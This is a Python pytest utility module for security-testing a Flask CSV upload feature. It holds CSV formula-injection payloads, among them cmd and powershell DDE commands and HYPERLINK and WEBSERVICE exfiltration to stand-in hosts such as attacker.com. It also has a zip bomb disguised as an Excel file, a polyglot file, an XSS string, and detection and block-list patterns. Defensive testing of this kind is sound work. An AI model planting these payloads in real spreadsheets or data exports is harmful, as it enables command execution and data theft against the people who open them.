#!/usr/bin/env python3
"""
Security Testing Utilities for Flask CSV Upload Testing
Provides common utilities, fixtures, and helper functions for security testing
based on 2025 Flask security testing best practices.
"""
import io
import os
import tempfile
import zipfile
import hashlib
import magic
from typing import List, Dict, Tuple, Optional, Any
import pandas as pd
import base64


class SecurityTestDataGenerator:
    """Generate test data for security testing scenarios"""
    
    @staticmethod
    def create_malicious_csv_payloads() -> Dict[str, str]:
        """Generate comprehensive CSV injection payloads"""
        return {
            # Formula injection - 2025 variants
            'calc_execution': '=1+1+cmd|"/c calc"!A0',
            'powershell_exec': '=cmd|"/c powershell -c Get-Process"!A0',
            'data_exfiltration': '=HYPERLINK("http://attacker.com/"&A1&B1)',
            'file_read': '=cmd|"/c type C:\\Windows\\system.ini"!A0',
            'dde_attack': '=cmd|"/c echo DDE attack"!A0',
            
            # Advanced Excel formula attacks
            'indirect_ref': '=INDIRECT("R1C1",FALSE)',
            'offset_attack': '=OFFSET(A1,999,999)',
            'macro_execution': '=Auto_Open()',
            'webservice_call': '=WEBSERVICE("http://evil.com/api")',
            
            # Unicode and encoding bypasses
            'unicode_equals': '＝cmd|"/c calc"!A0',  # Fullwidth =
            'encoded_formula': '=CHAR(99)&CHAR(109)&CHAR(100)',  # "cmd" in CHAR functions
            'concatenate_bypass': '=CONCATENATE("cm","d|/c calc")',
            
            # Nested and complex formulas
            'nested_if': '=IF(1=1,EXEC("calc.exe"),"")',
            'choose_exploit': '=CHOOSE(1,cmd|"/c calc"!A0,"safe")',
            'index_attack': '=INDEX({"malicious"},1)',
        }
    
    @staticmethod
    def create_executable_file_signatures() -> Dict[str, bytes]:
        """Generate file signatures for executable masquerading tests"""
        return {
            'windows_pe': b'\x4d\x5a\x90\x00',  # MZ header
            'linux_elf': b'\x7f\x45\x4c\x46',  # ELF header
            'java_class': b'\xca\xfe\xba\xbe',  # Java class file
            'python_pyc': b'\x16\x0d\x0d\x0a',  # Python bytecode
            'zip_archive': b'\x50\x4b\x03\x04',  # ZIP header
            'rar_archive': b'\x52\x61\x72\x21',  # RAR header
            'pdf_file': b'\x25\x50\x44\x46',    # PDF header
            'rtf_file': b'\x7b\x5c\x72\x74',    # RTF header
        }
    
    @staticmethod
    def create_polyglot_file(csv_content: str, executable_content: bytes) -> bytes:
        """Create a polyglot file that's both valid CSV and executable"""
        # Create a file that starts with shebang but is also valid CSV
        polyglot = b'#!/bin/bash\n# '
        polyglot += executable_content
        polyglot += b'\n'
        polyglot += csv_content.encode('utf-8')
        return polyglot
    
    @staticmethod
    def create_zip_bomb_excel() -> io.BytesIO:
        """Create a zip bomb disguised as Excel file"""
        zip_bomb = io.BytesIO()
        
        with zipfile.ZipFile(zip_bomb, 'w', zipfile.ZIP_DEFLATED) as zf:
            # Create highly compressible content
            large_data = '0' * (10 * 1024 * 1024)  # 10MB of zeros
            
            # Excel file structure
            zf.writestr('[Content_Types].xml', '<?xml version="1.0"?><Types/>')
            zf.writestr('xl/workbook.xml', '<?xml version="1.0"?><workbook/>')
            zf.writestr('xl/worksheets/sheet1.xml', f'<?xml version="1.0"?><worksheet><sheetData><row><c><v>{large_data}</v></c></row></sheetData></worksheet>')
            
        zip_bomb.seek(0)
        return zip_bomb
    
    @staticmethod
    def create_malformed_files() -> Dict[str, bytes]:
        """Create various malformed file types for testing"""
        return {
            'truncated_csv': b'Name,Company,Title\nJohn,Acme,',  # Incomplete row
            'invalid_quotes': b'Name,Company\n"John"Doe","Acme"Corp"',  # Unescaped quotes
            'binary_garbage': b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09',  # Binary data
            'empty_file': b'',  # Empty file
            'only_headers': b'Name,Company,Title',  # No data rows
            'mixed_encoding': 'Naïve,Café,Résumé'.encode('utf-8') + b'\xff\xfe\x00\x00',  # Mixed encodings
            'null_bytes': b'Name,Company\x00Title\nJohn,Acme\x00Corp,CEO',  # Embedded nulls
            'huge_field': b'Name,Company\n' + b'A' * (1024 * 1024) + b',Test Corp',  # 1MB field
        }


class FileValidationHelper:
    """Helper class for file validation testing"""
    
    @staticmethod
    def validate_file_magic(file_data: bytes, expected_type: str) -> bool:
        """Validate file using magic bytes"""
        try:
            mime_type = magic.from_buffer(file_data, mime=True)
            
            type_mapping = {
                'csv': 'text/plain',
                'excel': 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                'excel_legacy': 'application/vnd.ms-excel'
            }
            
            return mime_type == type_mapping.get(expected_type, expected_type)
        except:
            return False
    
    @staticmethod
    def detect_csv_injection(content: str) -> List[Dict[str, Any]]:
        """Detect potential CSV injection in content"""
        dangerous_patterns = [
            r'^=.*',  # Formulas starting with =
            r'^\+.*', # Formulas starting with +
            r'^-.*',  # Formulas starting with -
            r'^@.*',  # Formulas starting with @
            r'cmd\|',  # Command execution
            r'HYPERLINK', # Data exfiltration
            r'EXEC\(', # Direct execution
            r'Auto_Open', # Macro execution
        ]
        
        import re
        detections = []
        
        for line_num, line in enumerate(content.split('\n'), 1):
            for col_num, cell in enumerate(line.split(','), 1):
                cell = cell.strip('"')  # Remove quotes
                for pattern in dangerous_patterns:
                    if re.search(pattern, cell, re.IGNORECASE):
                        detections.append({
                            'line': line_num,
                            'column': col_num,
                            'pattern': pattern,
                            'content': cell[:100]  # First 100 chars
                        })
        
        return detections
    
    @staticmethod
    def sanitize_csv_content(content: str) -> str:
        """Sanitize CSV content by escaping dangerous formulas"""
        lines = content.split('\n')
        sanitized_lines = []
        
        for line in lines:
            cells = []
            for cell in line.split(','):
                cell = cell.strip()
                # Remove quotes temporarily
                quoted = cell.startswith('"') and cell.endswith('"')
                if quoted:
                    cell = cell[1:-1]
                
                # Escape dangerous characters
                if cell and cell[0] in '=+-@':
                    cell = "'" + cell  # Prepend single quote
                
                # Re-add quotes if originally quoted
                if quoted:
                    cell = '"' + cell + '"'
                    
                cells.append(cell)
            
            sanitized_lines.append(','.join(cells))
        
        return '\n'.join(sanitized_lines)


class SecurityTestAssertions:
    """Custom assertions for security testing"""
    
    @staticmethod
    def assert_no_code_execution_indicators(response_text: str, test_name: str = ""):
        """Assert that response doesn't contain code execution indicators"""
        dangerous_indicators = [
            'calc', 'notepad', 'cmd', 'powershell', 'exec', 'shell',
            'system', 'bash', 'sh', 'command', 'process', 'malware',
            'attacker.com', 'evil.com', 'malicious'
        ]
        
        for indicator in dangerous_indicators:
            assert indicator.lower() not in response_text.lower(), \
                   f"Response should not contain execution indicator '{indicator}' in {test_name}"
    
    @staticmethod
    def assert_no_sensitive_info_disclosure(response_text: str, test_name: str = ""):
        """Assert that response doesn't disclose sensitive system information"""
        sensitive_patterns = [
            r'/home/\w+',  # Linux home paths
            r'/usr/\w+',   # Linux system paths
            r'/var/\w+',   # Linux var paths
            r'C:\\[Ww]indows',  # Windows paths
            r'C:\\[Uu]sers',    # Windows user paths
            r'python.*\.py',    # Python file paths
            r'flask.*\.py',     # Flask file paths
            r'traceback',       # Python tracebacks
            r'exception.*:',    # Exception details
        ]
        
        import re
        for pattern in sensitive_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            assert not matches, f"Response should not contain sensitive pattern '{pattern}' in {test_name}: {matches}"
    
    @staticmethod
    def assert_proper_error_handling(response, expected_codes: List[int], test_name: str = ""):
        """Assert that response has proper error handling"""
        assert response.status_code in expected_codes, \
               f"Response code {response.status_code} not in expected codes {expected_codes} for {test_name}"
        
        if response.status_code >= 400:
            # Error responses should be properly formatted
            response_text = response.get_data(as_text=True)
            assert len(response_text) > 0, f"Error response should not be empty for {test_name}"
    
    @staticmethod
    def assert_session_security(session_data: dict, test_name: str = ""):
        """Assert that session data is secure"""
        dangerous_keys = ['password', 'secret', 'token', 'key', 'api_key']
        for key in dangerous_keys:
            assert key not in session_data, f"Session should not contain {key} for {test_name}"
        
        # Check for malicious content in session values
        for key, value in session_data.items():
            if isinstance(value, str):
                dangerous_content = ['=cmd', '+cmd', '-cmd', '@SUM', 'HYPERLINK', 'EXEC']
                for content in dangerous_content:
                    assert content not in value, f"Session {key} should not contain {content} for {test_name}"


class PerformanceSecurityHelper:
    """Helper for performance-related security testing"""
    
    @staticmethod
    def create_memory_exhaustion_csv(size_mb: int) -> str:
        """Create CSV designed to consume excessive memory"""
        # Create CSV with very wide rows
        num_columns = 1000
        headers = ','.join([f'Column{i}' for i in range(num_columns)])
        
        # Calculate rows needed for target size
        row_size = len(','.join(['Data'] * num_columns)) + 1  # +1 for newline
        num_rows = (size_mb * 1024 * 1024) // row_size
        
        rows = [headers]
        for i in range(min(num_rows, 10000)):  # Limit to prevent actual memory exhaustion
            row_data = ','.join([f'Data{i}_{j}' for j in range(num_columns)])
            rows.append(row_data)
        
        return '\n'.join(rows)
    
    @staticmethod
    def create_cpu_exhaustion_csv() -> str:
        """Create CSV with complex formulas that could exhaust CPU"""
        headers = "Name,Formula1,Formula2,Formula3,Formula4"
        rows = [headers]
        
        # Add rows with increasingly complex formulas
        for i in range(100):
            complex_formula = '=SUM(' + '+'.join([f'A{j}' for j in range(1, i+2)]) + ')'
            nested_formula = '=IF(SUM(A1:A100)>0,SUM(B1:B100),SUM(C1:C100))'
            
            row = f'User{i},{complex_formula},{nested_formula},=VLOOKUP(A{i},A:D,2,FALSE),=INDEX(MATCH(A{i},A:A,0),B:B)'
            rows.append(row)
        
        return '\n'.join(rows)
    
    @staticmethod
    def measure_processing_time(func, *args, **kwargs) -> Tuple[Any, float]:
        """Measure processing time for security testing"""
        import time
        start_time = time.time()
        result = func(*args, **kwargs)
        processing_time = time.time() - start_time
        return result, processing_time


class TestDataFactory:
    """Factory for creating various test data scenarios"""
    
    @staticmethod
    def create_realistic_csv_with_injections(num_rows: int = 1000) -> str:
        """Create realistic CSV data with scattered injection attempts"""
        headers = "First Name,Last Name,Company Name,Email,Job Title,Industry,City,State"
        rows = [headers]
        
        # Injection payloads to scatter throughout
        injection_payloads = [
            '=cmd|"/c calc"!A0',
            '=HYPERLINK("http://evil.com")',
            '@SUM(cmd|"/c dir"!A0)',
            '=EXEC("malware.exe")',
            '+cmd|"/c whoami"!A0'
        ]
        
        industries = ['Technology', 'Healthcare', 'Finance', 'Manufacturing', 'Retail']
        states = ['CA', 'NY', 'TX', 'FL', 'IL']
        
        for i in range(num_rows):
            # Insert injection payload every 200 rows
            if i % 200 == 0 and i > 0:
                payload_idx = (i // 200 - 1) % len(injection_payloads)
                first_name = injection_payloads[payload_idx]
            else:
                first_name = f"User{i}"
            
            row = f"{first_name},Lastname{i},Company{i},user{i}@company{i}.com,Title{i},{industries[i % len(industries)]},City{i},{states[i % len(states)]}"
            rows.append(row)
        
        return '\n'.join(rows)
    
    @staticmethod
    def create_edge_case_csv_data() -> Dict[str, str]:
        """Create CSV data for edge case testing"""
        return {
            'unicode_heavy': '''名前,会社,職種
田中太郎,株式会社テスト,エンジニア
=cmd|"/c calc"!A0,悪意のある会社,ハッカー
山田花子,テクノロジー株式会社,デザイナー''',
            
            'long_fields': f'''Name,Description,Company
John,{"A" * 10000},TechCorp
=HYPERLINK("http://evil.com"),{"B" * 5000},EvilCorp
Jane,{"C" * 15000},SafeCorp''',
            
            'special_characters': '''Name,Company,Notes
John O'Connor,AT&T Corp,"Has ""special"" chars"
=cmd|"/c calc",Evil & Co,<script>alert('xss')</script>
Jane,Tech@Corp,Normal user''',
            
            'mixed_encodings': '''Name,Company,Title
José,Café Corp,CEO
=cmd|"/c calc"!A0,攻撃者,Хакер
Marie,Résumé Inc,Naïve User''',
        }


# Pytest fixtures for common security testing scenarios
import pytest

@pytest.fixture
def security_test_data():
    """Provide security test data"""
    return SecurityTestDataGenerator()

@pytest.fixture
def file_validator():
    """Provide file validation helper"""
    return FileValidationHelper()

@pytest.fixture
def security_assertions():
    """Provide security test assertions"""
    return SecurityTestAssertions()

@pytest.fixture
def performance_helper():
    """Provide performance security helper"""
    return PerformanceSecurityHelper()

@pytest.fixture
def test_data_factory():
    """Provide test data factory"""
    return TestDataFactory()

@pytest.fixture
def temp_file_cleanup():
    """Cleanup temporary files after tests"""
    temp_files = []
    
    def create_temp_file(content: bytes, suffix: str = '.csv') -> str:
        """Create temporary file and track for cleanup"""
        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=suffix)
        temp_file.write(content)
        temp_file.close()
        temp_files.append(temp_file.name)
        return temp_file.name
    
    yield create_temp_file
    
    # Cleanup
    for temp_file in temp_files:
        try:
            os.unlink(temp_file)
        except OSError:
            pass  # File might already be deleted


if __name__ == '__main__':
    # Run some basic tests of the utilities
    generator = SecurityTestDataGenerator()
    payloads = generator.create_malicious_csv_payloads()
    print(f"Generated {len(payloads)} CSV injection payloads")
    
    validator = FileValidationHelper()
    detections = validator.detect_csv_injection("=cmd|/c calc,Normal,Data")
    print(f"Detected {len(detections)} potential injections")
    
    factory = TestDataFactory()
    realistic_data = factory.create_realistic_csv_with_injections(100)
    print(f"Generated realistic CSV with {len(realistic_data.split())} lines")